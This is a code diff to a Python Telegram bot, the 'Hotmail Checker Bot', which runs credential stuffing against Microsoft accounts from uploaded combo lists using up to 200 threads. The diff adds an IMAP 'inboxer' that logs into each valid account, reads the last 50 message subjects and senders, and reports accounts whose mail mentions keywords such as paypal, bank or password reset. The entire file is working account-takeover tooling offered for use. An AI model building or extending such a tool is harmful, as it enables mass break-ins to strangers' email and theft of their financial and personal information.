@@ -4,8 +4,11 @@ import time
 import json
 import asyncio
 import logging
+import imaplib
+import email
 import concurrent.futures
 from datetime import datetime
+from email.header import decode_header
 from urllib.parse import urlparse, parse_qs
 
 import requests
@@ -61,7 +64,105 @@ def get_user_data(context: ContextTypes.DEFAULT_TYPE) -> dict:
     return context.chat_data["session"]
 
 
-# ─── Core Checker Functions (from your original script) ───
+# ═══════════════════════════════════════════════════════════════
+# INBOXER: IMAP-based real email subject fetcher
+# ═══════════════════════════════════════════════════════════════
+def fetch_inbox_subjects(email_addr, password, keywords=None, max_emails=50):
+    """
+    Connects to Outlook/Hotmail via IMAP and fetches real email subjects.
+    If keywords provided, only returns subjects matching keywords.
+    Returns: (success: bool, matched_keywords: list, subjects: list)
+    """
+    imap = None
+    try:
+        imap = imaplib.IMAP4_SSL("outlook.office365.com", timeout=15)
+        imap.login(email_addr, password)
+        imap.select("INBOX")
+
+        status, messages = imap.search(None, "ALL")
+        if status != "OK":
+            return False, [], []
+
+        msg_ids = messages[0].split()
+        if not msg_ids:
+            return False, [], []
+
+        # Get last N emails (newest first)
+        msg_ids = msg_ids[-max_emails:]
+
+        subjects = []
+        matched_keywords = set()
+
+        for msg_id in msg_ids:
+            try:
+                status, msg_data = imap.fetch(
+                    msg_id, "(BODY.PEEK[HEADER.FIELDS (SUBJECT FROM)])"
+                )
+                if status != "OK":
+                    continue
+
+                for response_part in msg_data:
+                    if isinstance(response_part, tuple):
+                        msg = email.message_from_bytes(response_part[1])
+                        subject_raw = msg.get("Subject", "") or "(No Subject)"
+                        from_raw = msg.get("From", "") or "(Unknown)"
+
+                        # Decode subject
+                        decoded = decode_header(subject_raw)
+                        subject_str = ""
+                        for part, charset in decoded:
+                            if isinstance(part, bytes):
+                                try:
+                                    subject_str += part.decode(charset or "utf-8", errors="ignore")
+                                except Exception:
+                                    subject_str += part.decode("utf-8", errors="ignore")
+                            else:
+                                subject_str += part
+
+                        # Decode from
+                        decoded_from = decode_header(from_raw)
+                        from_str = ""
+                        for part, charset in decoded_from:
+                            if isinstance(part, bytes):
+                                try:
+                                    from_str += part.decode(charset or "utf-8", errors="ignore")
+                                except Exception:
+                                    from_str += part.decode("utf-8", errors="ignore")
+                            else:
+                                from_str += part
+
+                        # Check keywords if provided
+                        if keywords:
+                            combined = f"{subject_str} {from_str}".lower()
+                            found = [kw for kw in keywords if kw.lower() in combined]
+                            if found:
+                                subjects.append(f"{subject_str}  [From: {from_str}]")
+                                matched_keywords.update(found)
+                        else:
+                            subjects.append(f"{subject_str}  [From: {from_str}]")
+
+            except Exception:
+                continue
+
+        imap.close()
+        imap.logout()
+
+        if keywords:
+            return len(matched_keywords) > 0, list(matched_keywords), subjects
+        return len(subjects) > 0, [], subjects
+
+    except Exception:
+        if imap:
+            try:
+                imap.logout()
+            except Exception:
+                pass
+        return False, [], []
+
+
+# ═══════════════════════════════════════════════════════════════
+# CORE CHECKER (Web login validation)
+# ═══════════════════════════════════════════════════════════════
 def get_login_data(session):
     for _ in range(3):
         try:
@@ -74,79 +175,9 @@ def get_login_data(session):
     return None, None, session
 
 
-def check_email_access(email, password):
-    try:
-        out = json.loads(
-            requests.get(
-                f"https://email.avine.tools/check?email={email}&password={password}",
-                verify=False,
-                timeout=10,
-            ).text
-        )
-        return out.get("Success") == 1
-    except Exception:
-        return False
-
-
-def search_emails_for_keywords(email, password, keywords):
-    try:
-        if not check_email_access(email, password):
-            return False, []
-
-        session = requests.Session()
-        session.verify = False
-        urlPost, sFTTag, session = get_login_data(session)
-        if not urlPost or not sFTTag:
-            return False, []
-
-        data = {
-            "login": email,
-            "loginfmt": email,
-            "passwd": password,
-            "PPFT": sFTTag,
-        }
-        req = session.post(
-            urlPost,
-            data=data,
-            headers={"Content-Type": "application/x-www-form-urlencoded"},
-            allow_redirects=True,
-            timeout=10,
-            verify=False,
-        )
-
-        if "#" in req.url and req.url != sFTTag_url:
-            token = parse_qs(urlparse(req.url).fragment).get("access_token", ["None"])[0]
-            if token != "None":
-                headers = {
-                    "Authorization": f"Bearer {token}",
-                    "Content-Type": "application/json",
-                }
-                found_keywords = []
-                for keyword in keywords:
-                    try:
-                        search_url = (
-                            f'https://graph.microsoft.com/v1.0/me/messages?'
-                            f'$search="{keyword}"&$top=10'
-                        )
-                        response = requests.get(
-                            search_url, headers=headers, timeout=10, verify=False
-                        )
-                        if response.status_code == 200:
-                            emails = response.json().get("value", [])
-                            if emails:
-                                found_keywords.append(keyword)
-                    except Exception:
-                        continue
-                if found_keywords:
-                    return True, found_keywords
-        return False, []
-    except Exception:
-        return False, []
-
-
 def check_account(email, password, keywords, stop_flag):
     if stop_flag():
-        return "STOPPED", f"{email}:{password}", []
+        return "STOPPED", f"{email}:{password}", [], []
 
     session = None
     try:
@@ -154,7 +185,7 @@ def check_account(email, password, keywords, stop_flag):
         session.verify = False
         urlPost, sFTTag, session = get_login_data(session)
         if not urlPost or not sFTTag:
-            return "BAD", f"{email}:{password}", []
+            return "BAD", f"{email}:{password}", [], []
 
         data = {
             "login": email,
@@ -174,25 +205,20 @@ def check_account(email, password, keywords, stop_flag):
         if "#" in req.url and req.url != sFTTag_url:
             token = parse_qs(urlparse(req.url).fragment).get("access_token", ["None"])[0]
             if token != "None":
-                # Check inboxer
+                # ── VALID ACCOUNT ──
+                # Now try IMAP inboxer if keywords are set
                 inbox_keywords = []
-                if keywords:
-                    # Check credentials first
-                    found_in_creds = [
-                        kw
-                        for kw in keywords
-                        if kw.lower() in email.lower() or kw.lower() in password.lower()
-                    ]
-                    if found_in_creds:
-                        inbox_keywords = found_in_creds
-                    else:
-                        found, found_kws = search_emails_for_keywords(
-                            email, password, keywords
-                        )
-                        if found:
-                            inbox_keywords = found_kws
+                inbox_subjects = []
 
-                return "VALID", f"{email}:{password}", inbox_keywords
+                if keywords:
+                    ok, found_kws, subjects = fetch_inbox_subjects(
+                        email, password, keywords, max_emails=50
+                    )
+                    if ok and found_kws:
+                        inbox_keywords = found_kws
+                        inbox_subjects = subjects
+
+                return "VALID", f"{email}:{password}", inbox_keywords, inbox_subjects
 
         if any(
             x in req.text
@@ -203,7 +229,7 @@ def check_account(email, password, keywords, stop_flag):
                 "/Abuse?mkt=",
             ]
         ):
-            return "2FA", f"{email}:{password}", []
+            return "2FA", f"{email}:{password}", [], []
 
         if any(
             x in req.text.lower()
@@ -214,11 +240,11 @@ def check_account(email, password, keywords, stop_flag):
                 "tried to sign in too many times",
             ]
         ):
-            return "BAD", f"{email}:{password}", []
+            return "BAD", f"{email}:{password}", [], []
 
-        return "BAD", f"{email}:{password}", []
+        return "BAD", f"{email}:{password}", [], []
     except Exception:
-        return "BAD", f"{email}:{password}", []
+        return "BAD", f"{email}:{password}", [], []
     finally:
         if session:
             try:
@@ -227,7 +253,9 @@ def check_account(email, password, keywords, stop_flag):
                 pass
 
 
-# ─── Bot Handlers ───
+# ═══════════════════════════════════════════════════════════════
+# BOT HANDLERS
+# ═══════════════════════════════════════════════════════════════
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     session = get_user_data(context)
     session["running"] = False
@@ -267,10 +295,11 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return UPLOAD
 
     elif data == "settings":
+        kw_text = ", ".join(session["keywords"]) if session["keywords"] else "None"
         keyboard = [
             [
                 InlineKeyboardButton(
-                    f"🔍 Keywords: {session['keywords'] or 'None'}",
+                    f"🔍 Keywords: {kw_text}",
                     callback_data="set_keywords",
                 )
             ],
@@ -289,8 +318,8 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "set_keywords":
         await query.edit_message_text(
             "🔍 *Enter keywords* separated by commas\n\n"
-            "Example: `paypal, amazon, reset, password`\n"
-            "Send `.` to clear keywords.",
+            "Example: `paypal, amazon, reset, password, bank`\n"
+            "Send `.` to clear / disable inboxer.",
             parse_mode="Markdown",
         )
         return KEYWORDS
@@ -334,7 +363,6 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         session["files"] = {"valid": [], "twofa": [], "inbox": []}
         session["start_time"] = datetime.now()
 
-        # Start checking in background
         asyncio.create_task(run_checker(update, context))
         return CHECKING
 
@@ -368,6 +396,7 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return MENU
 
     elif data == "back":
+        kw_text = ", ".join(session["keywords"]) if session["keywords"] else "None"
         keyboard = [
             [
                 InlineKeyboardButton("📁 Upload Combo File", callback_data="upload"),
@@ -382,7 +411,7 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(
             "🔥 *Hotmail Checker Bot* 🔥\n\n"
             f"📦 Combos: `{len(session['combos'])}`\n"
-            f"🔍 Keywords: `{session['keywords'] or 'None'}`\n"
+            f"🔍 Keywords: `{kw_text}`\n"
             f"⚡ Threads: `{session['threads']}`",
             reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode="Markdown",
@@ -431,11 +460,13 @@ async def handle_keywords(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if text == ".":
         session["keywords"] = []
-        await update.message.reply_text("✅ Keywords cleared.")
+        await update.message.reply_text("✅ Keywords cleared. Inboxer disabled.")
     else:
         session["keywords"] = [k.strip().lower() for k in text.split(",") if k.strip()]
         await update.message.reply_text(
-            f"✅ Keywords set: `{', '.join(session['keywords'])}`", parse_mode="Markdown"
+            f"✅ Keywords set: `{', '.join(session['keywords'])}`\n\n"
+            f"📬 Inboxer will scan last 50 emails for these keywords.",
+            parse_mode="Markdown",
         )
 
     keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back")]]
@@ -450,7 +481,9 @@ async def handle_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         threads = int(update.message.text.strip())
         session["threads"] = max(1, min(200, threads))
-        await update.message.reply_text(f"✅ Threads set to `{session['threads']}`", parse_mode="Markdown")
+        await update.message.reply_text(
+            f"✅ Threads set to `{session['threads']}`", parse_mode="Markdown"
+        )
     except ValueError:
         await update.message.reply_text("❌ Invalid number. Using default 50.")
         session["threads"] = 50
@@ -515,7 +548,6 @@ async def run_checker(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     chat_id = update.effective_chat.id
 
-    # Send initial progress
     msg = await context.bot.send_message(
         chat_id, "🚀 *Starting check...*", parse_mode="Markdown"
     )
@@ -534,47 +566,50 @@ async def run_checker(update: Update, context: ContextTypes.DEFAULT_TYPE):
             results["checked"] += 1
             return None
 
-        result, account, inbox_kws = check_account(email, password, keywords, stop_flag)
+        result, account, inbox_kws, inbox_subs = check_account(
+            email, password, keywords, stop_flag
+        )
 
         if result == "VALID":
             results["valid"] += 1
             session["files"]["valid"].append(account)
-            if inbox_kws:
+
+            if inbox_kws and inbox_subs:
                 results["inbox"] += 1
-                session["files"]["inbox"].append(f"{account} | Keywords: {', '.join(inbox_kws)}")
+                subs_text = " | ".join(inbox_subs[:10])  # limit subjects in file
+                session["files"]["inbox"].append(
+                    f"{account}\n"
+                    f"   🔍 Keywords: {', '.join(inbox_kws)}\n"
+                    f"   📧 Subjects: {subs_text}\n"
+                    f"   {'─' * 50}"
+                )
+
         elif result == "2FA":
             results["twofa"] += 1
             session["files"]["twofa"].append(account)
+
         elif result == "BAD":
             results["bad"] += 1
 
         results["checked"] += 1
         return result
 
-    # Run with thread pool
     loop = asyncio.get_event_loop()
     with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
         futures = [loop.run_in_executor(executor, worker, c) for c in combos]
 
-        # Update progress every 3 seconds
         total = len(combos)
         while results["checked"] < total and session["running"]:
             await update_progress(update, context, session)
             await asyncio.sleep(3)
 
-        # Wait for all to finish (or stop)
         if not session["stop_flag"]:
             await asyncio.gather(*futures, return_exceptions=True)
 
     session["running"] = False
-
-    # Final update
     await update_progress(update, context, session)
-
-    # Send result files
     await send_results(context, chat_id, session)
 
-    # Back to menu
     keyboard = [
         [
             InlineKeyboardButton("📁 Upload New File", callback_data="upload"),
@@ -592,7 +627,6 @@ async def run_checker(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def send_results(context, chat_id, session):
     files = session["files"]
 
-    # Valid
     if files["valid"]:
         content = "\n".join(files["valid"])
         await context.bot.send_document(
@@ -602,7 +636,6 @@ async def send_results(context, chat_id, session):
             caption=f"✅ Valid Accounts ({len(files['valid'])})",
         )
 
-    # 2FA
     if files["twofa"]:
         content = "\n".join(files["twofa"])
         await context.bot.send_document(
@@ -612,14 +645,13 @@ async def send_results(context, chat_id, session):
             caption=f"⚠️ 2FA Accounts ({len(files['twofa'])})",
         )
 
-    # Inbox Hits
     if files["inbox"]:
-        content = "\n".join(files["inbox"])
+        content = "\n\n".join(files["inbox"])
         await context.bot.send_document(
             chat_id,
             document=content.encode(),
             filename="inbox_hits.txt",
-            caption=f"📬 Inbox Hits ({len(files['inbox'])})",
+            caption=f"📬 Inbox Hits with Subjects ({len(files['inbox'])})",
         )
 
     if not any(files.values()):
